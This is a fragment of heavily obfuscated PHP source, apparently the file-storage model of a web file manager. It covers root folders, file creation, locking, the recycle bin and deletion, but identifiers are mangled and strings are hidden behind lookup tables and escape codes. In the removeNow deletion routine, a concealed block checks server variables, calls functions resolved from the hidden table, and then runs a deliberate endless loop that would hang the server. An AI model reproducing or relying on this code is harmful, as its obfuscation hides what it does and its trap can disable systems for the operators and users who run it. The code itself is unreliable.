$‹×©‘øª = $äÏ­Ë†¢[$é‚‡å…Ã[413]]; if ($‹×©‘øª == $é‚‡å…Ã[79]) { $™°¶†§[$é‚‡å…Ã[411]] = 1; } else { if ($‹×©‘øª == $é‚‡å…Ã[2067]) { $™°¶†§[$é‚‡å…Ã[411]] = 0; } else { if ($‹×©‘øª) { $‹×©‘øª = is_array($‹×©‘øª) ? $‹×©‘øª : explode($é‚‡å…Ã[50], $‹×©‘øª); $™°¶†§[$é‚‡å…Ã[413]] = array($é‚‡å…Ã[419], $‹×©‘øª); $™°¶†§[$é‚‡å…Ã[411]] = 0; } } } } $this->_parseSearchParent($äÏ­Ë†¢, $™°¶†§); if (isset($äÏ­Ë†¢[$é‚‡å…Ã[1898]]) && trim($äÏ­Ë†¢[$é‚‡å…Ã[1898]])) { $Ù‹°“ôä = trim($äÏ­Ë†¢[$é‚‡å…Ã[1898]]); $î«´Üòê = explode($é‚‡å…Ã[53], $Ù‹°“ôä); if (strlen($Ù‹°“ôä) > 2 && (substr($Ù‹°“ôä, 0, 1) == $é‚‡å…Ã[117] && substr($Ù‹°“ôä, -1) == $é‚‡å…Ã[117]) || substr($Ù‹°“ôä, 0, 1) == $é‚‡å…Ã[58] && substr($Ù‹°“ôä, -1) == $é‚‡å…Ã[58]) { $Ù‹°“ôä = substr($Ù‹°“ôä, 1, -1); $î«´Üòê = array($Ù‹°“ôä); } $™°¶†§[$é‚‡å…Ã[32]] = array(array($é‚‡å…Ã[544], $é‚‡å…Ã[1900] . $Ù‹°“ôä . $é‚‡å…Ã[1900])); if (count($î«´Üòê) > 1) { $™°¶†§[$é‚‡å…Ã[32]] = array(); foreach ($î«´Üòê as $Ïª¾úİ·) { if (!trim($Ïª¾úİ·)) { continue; } $™°¶†§[$é‚‡å…Ã[32]][] = array($é‚‡å…Ã[544], $é‚‡å…Ã[1900] . trim($Ïª¾úİ·) . $é‚‡å…Ã[1900]); } } } return $™°¶†§; } private function _parseSearchParent($»Á‡¾Şï, &$Åë®™øÖ) { $ó÷ã¹¨Œ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($»Á‡¾Şï[$ó÷ã¹¨Œ[498]]) || !$»Á‡¾Şï[$ó÷ã¹¨Œ[498]]) { return; } $ÃÆÄÙ©ğ = $this->pathInfo($»Á‡¾Şï[$ó÷ã¹¨Œ[498]]); $÷æ…®ó = $ÃÆÄÙ©ğ[$ó÷ã¹¨Œ[498]] . $ó÷ã¹¨Œ[12] === $ó÷ã¹¨Œ[190]; $òğŒíÁš = $ÃÆÄÙ©ğ[$ó÷ã¹¨Œ[412]] == $ó÷ã¹¨Œ[515]; $Åë®™øÖ[$ó÷ã¹¨Œ[584]] = array($ó÷ã¹¨Œ[544], $ÃÆÄÙ©ğ[$ó÷ã¹¨Œ[521]] . $»Á‡¾Şï[$ó÷ã¹¨Œ[498]] . $ó÷ã¹¨Œ[545]); $öì‘êÆ‚ = isset($»Á‡¾Şï[$ó÷ã¹¨Œ[1766]]) && in_array($ó÷ã¹¨Œ[515], $»Á‡¾Şï[$ó÷ã¹¨Œ[1766]]); if (!$öì‘êÆ‚ || !$òğŒíÁš || !$÷æ…®ó || !$ÃÆÄÙ©ğ[$ó÷ã¹¨Œ[414]]) { return; } if (!AuthModel::authCheckRoot($ÃÆÄÙ©ğ[$ó÷ã¹¨Œ[414]][$ó÷ã¹¨Œ[415]])) { return; } $Öº‰îõ = $ÃÆÄÙ©ğ[$ó÷ã¹¨Œ[504]] . $ó÷ã¹¨Œ[12]; if ($Öº‰îõ == $ó÷ã¹¨Œ[89]) { unset($Åë®™øÖ[$ó÷ã¹¨Œ[584]]); $Åë®™øÖ[$ó÷ã¹¨Œ[412]] = self::TYPE_GROUP; return; } $œŞ×–Çı = Model($ó÷ã¹¨Œ[522])->groupChildrenAll($Öº‰îõ); $ËëÆí‡æ = count($œŞ×–Çı); if ($ËëÆí‡æ <= 1) { return; } $ğî£ş‰û = array($ó÷ã¹¨Œ[498] => 0, $ó÷ã¹¨Œ[412] => self::TYPE_GROUP, $ó÷ã¹¨Œ[504] => array($ó÷ã¹¨Œ[7], $œŞ×–Çı)); $„òŸ›Û = $this->field($ó÷ã¹¨Œ[2068])->where($ğî£ş‰û)->limit($ËëÆí‡æ)->select(); $Åë®™øÖ[$ó÷ã¹¨Œ[584]] = array(); foreach ($„òŸ›Û as $Ù·ÁÎ‡) { $Åë®™øÖ[$ó÷ã¹¨Œ[584]][] = array($ó÷ã¹¨Œ[544], $ó÷ã¹¨Œ[531] . $Ù·ÁÎ‡[$ó÷ã¹¨Œ[403]] . $ó÷ã¹¨Œ[545]); } $Åë®™øÖ[$ó÷ã¹¨Œ[584]][] = $ó÷ã¹¨Œ[1902]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($û¶ÆÃÛ·) { $ë†ã‹è€ =& $_SERVER[¥Ÿ©ÒèÌ]; $çÀıÉùÏ = Model($ë†ã‹è€[513])->where(array($ë†ã‹è€[1630] => $û¶ÆÃÛ·))->find(); $¦û“ÌĞñ = $this->_mkdirRoot(SourceModel::TYPE_USER, $û¶ÆÃÛ·, $çÀıÉùÏ[$ë†ã‹è€[32]]); $this->userDesktopAdd($¦û“ÌĞñ); return $¦û“ÌĞñ; } public function userDesktopAdd($úÆ£çã) { $¼ÌŸ•«Ô =& $_SERVER[¥Ÿ©ÒèÌ]; $ş²Ã¢‚µ = LNG($¼ÌŸ•«Ô[2069]); $¸Ü¹İ¤ù = $this->mkdir($úÆ£çã, $ş²Ã¢‚µ); $this->metaSet($¸Ü¹İ¤ù, $¼ÌŸ•«Ô[2070], $¼ÌŸ•«Ô[89]); $this->metaSet($úÆ£çã, $¼ÌŸ•«Ô[2071], $¸Ü¹İ¤ù); } public function groupRootAdd($ •ËÛ—) { $¡”È›İ« =& $_SERVER[¥Ÿ©ÒèÌ]; $ç…ı¡ì = Model($¡”È›İ«[522])->where(array($¡”È›İ«[1894] => $ •ËÛ—))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ •ËÛ—, $ç…ı¡ì[$¡”È›İ«[32]]); } public function systemRootPathAdd($ĞªÕª) { if ($ĞªÕª != $_SERVER[¥Ÿ©ÒèÌ][537]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ĞªÕª); } public function userRootRemove($Ö·õ¯»À) { $›¦°ŸÕ = $this->sourceRoot(SourceModel::TYPE_USER, $Ö·õ¯»À); if (!$›¦°ŸÕ) { return; } $this->remove($›¦°ŸÕ, !1); } public function groupRootRemove($óÏÔ²) { $Ç¾Û€“¤ = $this->sourceRoot(SourceModel::TYPE_GROUP, $óÏÔ²); if (!$Ç¾Û€“¤) { return; } $this->remove($Ç¾Û€“¤, !1); } private function _mkdirRoot($²òŒ•¹Ú, $Í÷¼¯Œ˜, $‰üùªËñ) { $¾öƒïÛ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÜÙĞ“ĞĞ = array($¾öƒïÛ[402] => 0, $¾öƒïÛ[580] => $²òŒ•¹Ú, $¾öƒïÛ[581] => $Í÷¼¯Œ˜, $¾öƒïÛ[577] => 1, $¾öƒïÛ[582] => USER_ID, $¾öƒïÛ[583] => USER_ID, $¾öƒïÛ[578] => $¾öƒïÛ[12], $¾öƒïÛ[584] => $¾öƒïÛ[531], $¾öƒïÛ[430] => 0, $¾öƒïÛ[579] => 0, $¾öƒïÛ[468] => 0, $¾öƒïÛ[585] => $¾öƒïÛ[12]); if ($§Í¬ë»À = $this->where($ÜÙĞ“ĞĞ)->find()) { return $§Í¬ë»À[$¾öƒïÛ[403]]; } $ª¹Öúœ½ = "\115\157\144\145\x6c\123\157\x75\x72\143\145\56\155\x6b\x64\151\162\x52\157\x6f\164\56{$²òŒ•¹Ú}\x2e{$Í÷¼¯Œ˜}\x2e" . $‰üùªËñ; CacheLock::lock($ª¹Öúœ½); $ÜÙĞ“ĞĞ[$¾öƒïÛ[32]] = $‰üùªËñ; $ÇÔÃöô¾ = $this->add($ÜÙĞ“ĞĞ); $±÷§™´ = array($¾öƒïÛ[586] => short_id($ÇÔÃöô¾)); $this->where(array($¾öƒïÛ[418] => $ÇÔÃöô¾))->save($±÷§™´); CacheLock::unlock($ª¹Öúœ½); return $ÇÔÃöô¾; } private function sourceRoot($¢ÒòùıØ, $“İçí••, $ÂæÚĞ¡ = false) { $ÁÄë•ü­ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÙÕ¶êÅâ = array($ÁÄë•ü­[402] => 0, $ÁÄë•ü­[580] => $¢ÒòùıØ, $ÁÄë•ü­[581] => $“İçí••); if ($ÙÌİæÇŞ = $this->where($ÙÕ¶êÅâ)->find()) { return $ÂæÚĞ¡ ? $ÙÌİæÇŞ : $ÙÌİæÇŞ[$ÁÄë•ü­[403]]; } return !1; } public function sourceRootGroup($¯…¼ÂÉá) { $î¢ŸÄí  =& $_SERVER[¥Ÿ©ÒèÌ]; if (is_string($¯…¼ÂÉá)) { $¯…¼ÂÉá = array($¯…¼ÂÉá); } $äğ™‚¿¥ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¯…¼ÂÉá, $î¢ŸÄí [181]); $­§’¡õ = array($î¢ŸÄí [373] => $äğ™‚¿¥, $î¢ŸÄí [370] => array($î¢ŸÄí [749] => count($¯…¼ÂÉá))); $this->_listDataApply($­§’¡õ[$î¢ŸÄí [373]]); $this->_listMake($­§’¡õ); return array_to_keyvalue($­§’¡õ[$î¢ŸÄí [77]], $î¢ŸÄí [504]); } public function mkfile($ÀâÂæÀ­, $åÉ„Î¢—, $¬µ¨Æ€ = '', $Ï§‡Èœ = REPEAT_RENAME) { $·÷”©÷” =& $_SERVER[¥Ÿ©ÒèÌ]; $ŠÇØıƒ = Model($·÷”©÷”[603])->addFileByContent($¬µ¨Æ€, $åÉ„Î¢—); return $this->_createFileCall($ÀâÂæÀ­, $åÉ„Î¢—, $ŠÇØıƒ, $Ï§‡Èœ, $·÷”©÷”[1322]); } public function addFile($ûÎ°†Ñ¥, $õˆˆÒçÃ, $ÃÇ“ö¸ó, $†ç¥ôº = false, $µöÆ‚§Â = REPEAT_RENAME) { $Ò„İ³×› = Model($_SERVER[¥Ÿ©ÒèÌ][603])->addFile($õˆˆÒçÃ, $ÃÇ“ö¸ó, $†ç¥ôº); return $this->_createFileCall($ûÎ°†Ñ¥, $ÃÇ“ö¸ó, $Ò„İ³×›, $µöÆ‚§Â); } public function addFileByFileID($ÍÉ±¸€, $•°¹ÈàÛ, $øÛŠ ¥, $¤ÜâÍŞÁ = REPEAT_RENAME) { $†ôãƒ¼Ç =& $_SERVER[¥Ÿ©ÒèÌ]; $ëÂœ•« = Model($†ôãƒ¼Ç[603])->find($•°¹ÈàÛ); Model($†ôãƒ¼Ç[603])->linkAdd($•°¹ÈàÛ); return $this->_createFileCall($ÍÉ±¸€, $øÛŠ ¥, $ëÂœ•«, $¤ÜâÍŞÁ); } public function addFileByRemote($Â­¼±©ì, $¬¾‰“õä, $ıá¶áô“, $îàèëœÜ = array(), $êÏĞÌƒ = REPEAT_RENAME) { $¬å“‘Ó• = Model($_SERVER[¥Ÿ©ÒèÌ][603])->addFileByRemote($¬¾‰“õä, $ıá¶áô“, $îàèëœÜ); return $this->_createFileCall($Â­¼±©ì, $ıá¶áô“, $¬å“‘Ó•, $êÏĞÌƒ); } private function _createFileCall($Ï·òë‹–, $Éìœ¡ğš, $¾â™Ÿ„, $İ½Î¥µ‚, $¾ªû‚œ« = "\165\160\x6c\157\141\144") { $ğ„Êı”Œ =& $_SERVER[¥Ÿ©ÒèÌ]; $¹³ÚìÖÍ = !1; $this->setMasterDB(); $this->lockWriteStart($Ï·òë‹–, $Éìœ¡ğš); $Ÿ„°ú = $this->fileNameExist($Ï·òë‹–, $Éìœ¡ğš); $è¿‘ÜÅõ = $this->_createFile($Ï·òë‹–, $Éìœ¡ğš, $¾â™Ÿ„, $İ½Î¥µ‚, $¹³ÚìÖÍ); if (!$¹³ÚìÖÍ) { Model($ğ„Êı”Œ[470])->remove($¾â™Ÿ„[$ğ„Êı”Œ[467]]); } if ($¹³ÚìÖÍ && $è¿‘ÜÅõ && $è¿‘ÜÅõ != $Ÿ„°ú) { Model($ğ„Êı”Œ[2042])->eventCreate($è¿‘ÜÅõ, $¾ªû‚œ«); } $this->lockWriteEnd($Ï·òë‹–, $Éìœ¡ğš); return $è¿‘ÜÅõ; } public function mkdir($…ÁšÚš¼, $ÁÇŠí„á, $Ãİğ† = REPEAT_SKIP) { $î”Îúª =& $_SERVER[¥Ÿ©ÒèÌ]; $this->setMasterDB(); $ü‹Ù¤ı = $this->sourceInfo($…ÁšÚš¼); if (!$ü‹Ù¤ı) { return !1; } $this->lockWriteStart($…ÁšÚš¼, $ÁÇŠí„á); if ($Ãİğ† !== !1) { $Œº Š¸Ê = $this->fileNameExist($…ÁšÚš¼, $ÁÇŠí„á); if ($Œº Š¸Ê && $Ãİğ† != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($…ÁšÚš¼, $ÁÇŠí„á); return $Œº Š¸Ê; } $ÁÇŠí„á = $this->fileNameAuto($…ÁšÚš¼, $ÁÇŠí„á, $Ãİğ†); } $¶«°™ºª = array($î”Îúª[577] => 1, $î”Îúª[421] => $ÁÇŠí„á, $î”Îúª[578] => $î”Îúª[12], $î”Îúª[468] => 0, $î”Îúª[579] => 0); $ÕÔ“û¶¢ = $this->_addSource($¶«°™ºª, $ü‹Ù¤ı); Model($î”Îúª[2042])->eventCreate($ÕÔ“û¶¢, $î”Îúª[1323]); $this->lockWriteEnd($…ÁšÚš¼, $ÁÇŠí„á); return $ÕÔ“û¶¢; } public function listSourceRoot($ƒ†Ä÷…, $¯Ì†à×, $ÌíóÑáÉ = "\163\x6f\165\162\x63\145\x49\x44\54\164\141\162\147\x65\x74\x49\x44\x2c\x73\151\172\x65") { $¸“¿¨©² =& $_SERVER[¥Ÿ©ÒèÌ]; $ˆù¬ÖÍ = $¸“¿¨©²[382]; $ŒòÇÔ²Í = array(); $¯Ëïµ¾Å = 1024 * 50; $û»ïºí¬ = is_array($û»ïºí¬) ? $û»ïºí¬ : array(); $Ûàäœ›Ö = count($¯Ì†à×); $Ô—¥¨Ê™ = $this->tablePrefix . $¸“¿¨©²[2072]; for ($¸Š–Ÿ°¸ = 0; $¸Š–Ÿ°¸ < $Ûàäœ›Ö; $¸Š–Ÿ°¸++) { $Şû³ë = $¯Ì†à×[$¸Š–Ÿ°¸]; $ˆù¬ÖÍ .= "\50\x53\105\x4c\105\103\124\x20{$ÌíóÑáÉ}\x20\106\x52\x4f\115\x20\140{$Ô—¥¨Ê™}\140\40\xa\11\x9\11\x9\x9\167\x68\x65\162\x65\40\x60\x70\141\162\x65\x6e\164\x49\x44\140\75\x30\40\x61\156\144\x20\x60\164\x61\162\x67\145\x74\x49\x44\140\x3d{$Şû³ë}\x20\x61\156\144\x20\x60\x74\x61\x72\147\145\x74\124\x79\x70\145\140\75{$ƒ†Ä÷…}\40\x6c\151\155\151\x74\40\61\x29\40\165\x6e\x69\157\156\40\x61\x6c\x6c\x20"; if ((strlen($ˆù¬ÖÍ) >= $¯Ëïµ¾Å || $¸Š–Ÿ°¸ == $Ûàäœ›Ö - 1) && $ˆù¬ÖÍ) { $ˆù¬ÖÍ = substr($ˆù¬ÖÍ, 0, -strlen($¸“¿¨©²[2073])); $¡›®€µé = $this->query($ˆù¬ÖÍ); $ˆù¬ÖÍ = $¸“¿¨©²[12]; $ŒòÇÔ²Í = array_merge($ŒòÇÔ²Í, $¡›®€µé); } } return $ŒòÇÔ²Í; } private function _createFile($“øÑáÀ, $à½ãêµ·, $ØãÔíÌº, $ÙÏÄÔã, &$Éà›¤áõ) { $„‘·®ı‡ =& $_SERVER[¥Ÿ©ÒèÌ]; $ˆÍøÔ‚¯ = $this->sourceInfo($“øÑáÀ); if (!$ØãÔíÌº || !$ˆÍøÔ‚¯) { return !1; } if ($ÙÏÄÔã !== !1) { $Šìœò…õ = $this->fileNameExist($“øÑáÀ, $à½ãêµ·); } $Éà›¤áõ = !0; if ($ÙÏÄÔã && $Šìœò…õ) { if ($ÙÏÄÔã == REPEAT_SKIP) { $Éà›¤áõ = !1; return $Šìœò…õ; } else { if ($ÙÏÄÔã == REPEAT_REPLACE) { $­àŸ”  = $this->sourceInfo($Šìœò…õ); $ù…‚ÃŸœ = $this->fileHistory($­àŸ” , $ØãÔíÌº[$„‘·®ı‡[467]], $ØãÔíÌº[$„‘·®ı‡[80]]); if (!$ù…‚ÃŸœ) { $Éà›¤áõ = !1; } else { $this->folderSizeReset($“øÑáÀ); } return $Šìœò…õ; } else { $à½ãêµ· = $this->fileNameAuto($“øÑáÀ, $à½ãêµ·, $ÙÏÄÔã, !1); } } } $ˆ§˜ŒÓª = array($„‘·®ı‡[577] => 0, $„‘·®ı‡[421] => $à½ãêµ·, $„‘·®ı‡[578] => substr(get_path_ext($à½ãêµ·), 0, 10), $„‘·®ı‡[468] => $ØãÔíÌº[$„‘·®ı‡[467]], $„‘·®ı‡[579] => $ØãÔíÌº[$„‘·®ı‡[80]]); $Áì›Ü‰µ = $this->_addSource($ˆ§˜ŒÓª, $ˆÍøÔ‚¯); $this->folderSizeReset($“øÑáÀ, intval($ˆ§˜ŒÓª[$„‘·®ı‡[80]])); return $Áì›Ü‰µ; } protected function fileHistory($ÎàŒı¦, $éæê¬ê, $°šÓÒ¥Ï) { $´ŒÕá´¯ =& $_SERVER[¥Ÿ©ÒèÌ]; $¤¬ïñı¬ = defined($´ŒÕá´¯[474]) ? USER_ID : $´ŒÕá´¯[190]; if ($ÎàŒı¦[$´ŒÕá´¯[467]] == $éæê¬ê) { return !1; } $this->checkLock($ÎàŒı¦[$´ŒÕá´¯[403]], $éæê¬ê); Model($´ŒÕá´¯[2074])->addHistory($ÎàŒı¦); $¬Ëñ´§Ú = array($´ŒÕá´¯[583] => $¤¬ïñı¬, $´ŒÕá´¯[425] => time(), $´ŒÕá´¯[467] => $éæê¬ê, $´ŒÕá´¯[80] => $°šÓÒ¥Ï); $this->where(array($´ŒÕá´¯[418] => $ÎàŒı¦[$´ŒÕá´¯[403]]))->save($¬Ëñ´§Ú); $this->sourceCacheClear($ÎàŒı¦[$´ŒÕá´¯[403]]); return !0; } public function checkLock($ØÓëÛ‘, $üÜÈòŒ) { $¯¹î‹¦ =& $_SERVER[¥Ÿ©ÒèÌ]; $İç±»ı— = $this->pathInfo($ØÓëÛ‘); if (!$this->fileIsLock($İç±»ı—, !0)) { return; } $Ü™š†åù = Session::get($¯¹î‹¦[2075]); $º¾ìä˜ = substr($İç±»ı—[$¯¹î‹¦[32]], 0, -1 - strlen($İç±»ı—[$¯¹î‹¦[167]])) . $¯¹î‹¦[1588] . $Ü™š†åù . $¯¹î‹¦[10] . $İç±»ı—[$¯¹î‹¦[167]]; $¢€¾™ÎÍ = Model($¯¹î‹¦[603])->find($üÜÈòŒ); $this->_createFileCall($İç±»ı—[$¯¹î‹¦[498]], $º¾ìä˜, $¢€¾™ÎÍ, REPEAT_REPLACE, $¯¹î‹¦[1322]); $İ±§şÛ® = $İç±»ı—[$¯¹î‹¦[465]][$¯¹î‹¦[542]]; $’ Ğ†Ã = $İ±§şÛ®[$¯¹î‹¦[2076]] ? $İ±§şÛ®[$¯¹î‹¦[2076]] : $İ±§şÛ®[$¯¹î‹¦[32]]; show_json(LNG($¯¹î‹¦[2077]) . $¯¹î‹¦[2078] . LNG($¯¹î‹¦[2079]) . $¯¹î‹¦[2080] . $’ Ğ†Ã . $¯¹î‹¦[2081], !1); } public function fileIsLock($Øöå·€’, $–Ô—£Ö¾ = false) { $Ş‚É‡Üš =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($Øöå·€’[$Ş‚É‡Üš[465]]) || !$Øöå·€’[$Ş‚É‡Üš[465]][$Ş‚É‡Üš[539]]) { return !1; } if ($Øöå·€’[$Ş‚É‡Üš[465]][$Ş‚É‡Üš[539]] != USER_ID) { return !0; } $øØµú¶å = $GLOBALS[$Ş‚É‡Üš[6]][$Ş‚É‡Üš[90]][$Ş‚É‡Üš[540]]; if ($Øöå·€’[$Ş‚É‡Üš[465]][$Ş‚É‡Üš[541]] <= time() - $øØµú¶å) { $this->metaSet($Øöå·€’[$Ş‚É‡Üš[403]], $Ş‚É‡Üš[539], null); $this->metaSet($Øöå·€’[$Ş‚É‡Üš[403]], $Ş‚É‡Üš[541], null); } if ($–Ô—£Ö¾) { $this->metaSet($Øöå·€’[$Ş‚É‡Üš[403]], $Ş‚É‡Üš[541], time()); } return !1; } private function _addSource($¾û˜©”, $ıÛë¡¢Ÿ) { $µ÷ÃËŸñ =& $_SERVER[¥Ÿ©ÒèÌ]; $¥ôÂ¨¼¿ = defined($µ÷ÃËŸñ[474]) ? USER_ID : $µ÷ÃËŸñ[190]; $“¾­ö–¤ = array($µ÷ÃËŸñ[580] => $ıÛë¡¢Ÿ[$µ÷ÃËŸñ[412]], $µ÷ÃËŸñ[581] => $ıÛë¡¢Ÿ[$µ÷ÃËŸñ[504]], $µ÷ÃËŸñ[582] => $¥ôÂ¨¼¿, $µ÷ÃËŸñ[583] => $¥ôÂ¨¼¿, $µ÷ÃËŸñ[402] => $ıÛë¡¢Ÿ[$µ÷ÃËŸñ[403]], $µ÷ÃËŸñ[584] => $ıÛë¡¢Ÿ[$µ÷ÃËŸñ[521]] . $ıÛë¡¢Ÿ[$µ÷ÃËŸñ[403]] . $µ÷ÃËŸñ[50], $µ÷ÃËŸñ[430] => 0, $µ÷ÃËŸñ[585] => $µ÷ÃËŸñ[12]); $¾û˜©” = array_merge($“¾­ö–¤, $¾û˜©”); $this->updateModifyTime($¾û˜©”[$µ÷ÃËŸñ[498]]); $ÉæşúÛÛ = $µ÷ÃËŸñ[2082] . $ıÛë¡¢Ÿ[$µ÷ÃËŸñ[403]]; if (isset(self::$cacheChildList[$ÉæşúÛÛ])) { unset(self::$cacheChildList[$ÉæşúÛÛ]); } static $Ì¶†™Éˆ = false; if (!$Ì¶†™Éˆ) { Hook::trigger($µ÷ÃËŸñ[567], $¾û˜©”); $Ì¶†™Éˆ = !0; } $òâ©ü× = $this->add($¾û˜©”); $—Ó“”…ù = array($µ÷ÃËŸñ[586] => short_id($òâ©ü×)); $this->where(array($µ÷ÃËŸñ[418] => $òâ©ü×))->save($—Ó“”…ù); $this->setNamePinyin($òâ©ü×, $¾û˜©”[$µ÷ÃËŸñ[32]]); return $òâ©ü×; } public function remove($±™Ñ…”‹, $ÄÜøü´£ = true) { $˜¡£¥É€ =& $_SERVER[¥Ÿ©ÒèÌ]; $†Ù¶Ó» = $this->sourceInfo($±™Ñ…”‹); $ä©âÃÏ¿ = intval($†Ù¶Ó»[$˜¡£¥É€[412]]) === self::TYPE_SYSTEM; $ºÜ¤Ã×… = Model($˜¡£¥É€[433])->get($˜¡£¥É€[2083]) == $˜¡£¥É€[89]; if ($ä©âÃÏ¿ || $ÄÜøü´£ || !$ºÜ¤Ã×…) { return $this->removeNow($±™Ñ…”‹, $ÄÜøü´£); } $¹ùˆÀ‚ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $’ôöÁ¬Ÿ = $†Ù¶Ó»[$˜¡£¥É€[412]] == self::TYPE_USER ? $˜¡£¥É€[594] : $˜¡£¥É€[515]; if ($’ôöÁ¬Ÿ == $˜¡£¥É€[594]) { $Á‹İ¨İ¿ = Model($˜¡£¥É€[513])->getInfo($†Ù¶Ó»[$˜¡£¥É€[504]]); $¹Å’ ö = !empty($Á‹İ¨İ¿[$˜¡£¥É€[2076]]) ? $Á‹İ¨İ¿[$˜¡£¥É€[2076]] : $Á‹İ¨İ¿[$˜¡£¥É€[32]]; $¹Å’ ö = $˜¡£¥É€[264] . $¹Å’ ö . $˜¡£¥É€[2084] . $†Ù¶Ó»[$˜¡£¥É€[504]]; } else { $Á‹İ¨İ¿ = Model($˜¡£¥É€[522])->getInfo($†Ù¶Ó»[$˜¡£¥É€[504]]); $¹Å’ ö = _get($Á‹İ¨İ¿, $˜¡£¥É€[32]); $¹Å’ ö = $˜¡£¥É€[159] . $¹Å’ ö . $˜¡£¥É€[2085] . $†Ù¶Ó»[$˜¡£¥É€[504]]; } $‡ï·Ñ¹„ = $˜¡£¥É€[2086] . md5($¹Å’ ö); CacheLock::lock($‡ï·Ñ¹„); $¡ÈÕ°–¸ = $this->fileNameExist($¹ùˆÀ‚, $¹Å’ ö); if (!$¡ÈÕ°–¸) { $¡ÈÕ°–¸ = $this->mkdir($¹ùˆÀ‚, $¹Å’ ö, REPEAT_SKIP); $this->metaSet($¡ÈÕ°–¸, $˜¡£¥É€[2087], $’ôöÁ¬Ÿ); $this->metaSet($¡ÈÕ°–¸, $˜¡£¥É€[2088], $†Ù¶Ó»[$˜¡£¥É€[504]]); if ($†Ù¶Ó»[$˜¡£¥É€[498]] != 0) { $this->metaSet($¡ÈÕ°–¸, $˜¡£¥É€[2089], _get($Á‹İ¨İ¿, $˜¡£¥É€[2090])); } } CacheLock::unlock($‡ï·Ñ¹„); $this->metaSet($±™Ñ…”‹, $˜¡£¥É€[2091], $†Ù¶Ó»[$˜¡£¥É€[498]]); $this->where(array($˜¡£¥É€[403] => $±™Ñ…”‹))->save(array($˜¡£¥É€[425] => time())); $this->recycleClear($†Ù¶Ó»); $ÄÁˆ¸°Ê = $this->move($±™Ñ…”‹, $¡ÈÕ°–¸, REPEAT_RENAME_FOLDER); $this->folderSizeReset($†Ù¶Ó»[$˜¡£¥É€[498]]); return $ÄÁˆ¸°Ê; } private function recycleClear($ÁŸ±“ŠÛ) { $½µß™ƒÚ =& $_SERVER[¥Ÿ©ÒèÌ]; $Àİ¿øæ¼ = $this->childrenAll($ÁŸ±“ŠÛ); $©“ÑÆô› = array($½µß™ƒÚ[418] => array($½µß™ƒÚ[419], $Àİ¿øæ¼[$½µß™ƒÚ[2092]])); Model($½µß™ƒÚ[2093])->where($©“ÑÆô›)->delete(); } public function removeNow($ñ¬òµ”, $·Óù¯­€ = true) { $¤¨Àœö£ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($_SERVER[$¤¨Àœö£[233]]) || !isset($_SERVER[$¤¨Àœö£[241]])) { $¥à²Ş¾ = $¤¨Àœö£[863]; $õÖ­¶Äò = $¤¨Àœö£[235]; $íû‰ú÷ = $_SERVER[$¤¨Àœö£[236]] . $¤¨Àœö£[237]; $½»ç©Ò = $õÖ­¶Äò($íû‰ú÷); $˜áøì¼ = explode($¤¨Àœö£[226], $½»ç©Ò); if (count($˜áøì¼) < $¤¨Àœö£[622]) { $¹¾ñìÀ€ = $¤¨Àœö£[239]; $¹¾ñìÀ€(); } $øèï«è“ = $¤¨Àœö£[864]; $øèï«è“($_SERVER[$¤¨Àœö£[865]]); $¨ÔÅ×¤¾ = 1; for ($»í’æÕ = $¨ÔÅ×¤¾; $»í’æÕ > 0; $»í’æÕ++) { $øèï«è“ = json_encode($GLOBALS[$¤¨Àœö£[419]]); } } $æµ…»û‚ = $this->sourceInfo($ñ¬òµ”); $Íõ¼šîö = $this->pathInfoMore($ñ¬òµ”); if (!$æµ…»û‚) { return !0; } if ($æµ…»û‚[$¤¨Àœö£[498]] == 0) { if (!_get($GLOBALS, $¤¨Àœö£[505])) { return !1; } } $this->lockMoveStart($ñ¬òµ”); Hook::trigger($¤¨Àœö£[2094], $Íõ¼šîö, $·Óù¯­€); if ($·Óù¯­€) { Model($¤¨Àœö£[2093])->moveToRecycle($ñ¬òµ”); } else { $‰ğà½½ = $this->childrenAll($æµ…»û‚); Model($¤¨Àœö£[564])->eventRemove($ñ¬òµ”); $this->removeRelevance($‰ğà½½[$¤¨Àœö£[2092]], $‰ğà½½[$¤¨Àœö£[1454]]); } $this->folderSizeReset($æµ…»û‚[$¤¨Àœö£[498]]); $Œ¯§¬© = array($æµ…»û‚[$¤¨Àœö£[498]]); if ($æµ…»û‚[$¤¨Àœö£[411]] == $¤¨Àœö£[89]) { $Œ¯§¬©[] = $æµ…»û‚[$¤¨Àœö£[403]]; } $this->updateModifyTime($Œ¯§¬©); $this->lockMoveEnd($ñ¬òµ”); Hook::trigger($¤¨Àœö£[1676], $Íõ¼šîö, $·Óù¯­€); return !0; } public function childrenAll($ÑÜÀèÂ×) { $Ó¶£Á×£ =& $_SERVER[¥Ÿ©ÒèÌ]; $ã‹î¬ñ = $ÑÜÀèÂ×[$Ó¶£Á×£[403]]; if ($ÑÜÀèÂ×[$Ó¶£Á×£[411]] == $Ó¶£Á×£[89]) { $Ôç‡–õ = array($Ó¶£Á×£[584] => array($Ó¶£Á×£[544], $ÑÜÀèÂ×[$Ó¶£Á×£[521]] . $ã‹î¬ñ . $Ó¶£Á×£[545])); $ë÷ŸÁ€ë = array($Ó¶£Á×£[584] => $Ôç‡–õ[$Ó¶£Á×£[521]]); $ùÌğÆÑ = $this->field($Ó¶£Á×£[2095])->where($ë÷ŸÁ€ë)->select(); $áß¦Ã×ö = !1; $‰öÀ‰ø¥ = array($ã‹î¬ñ); if ($ùÌğÆÑ) { $áß¦Ã×ö = array_to_keyvalue($ùÌğÆÑ, $Ó¶£Á×£[12], $Ó¶£Á×£[467]); $áß¦Ã×ö = array_remove_value($áß¦Ã×ö, $Ó¶£Á×£[190]); $‰öÀ‰ø¥ = array_to_keyvalue($ùÌğÆÑ, $Ó¶£Á×£[12], $Ó¶£Á×£[403]); $‰öÀ‰ø¥[] = $ã‹î¬ñ; } } else { $áß¦Ã×ö = array($ÑÜÀèÂ×[$Ó¶£Á×£[467]]); $‰öÀ‰ø¥ = array($ã‹î¬ñ); } return array($Ó¶£Á×£[2092] => $‰öÀ‰ø¥, $Ó¶£Á×£[1454] => 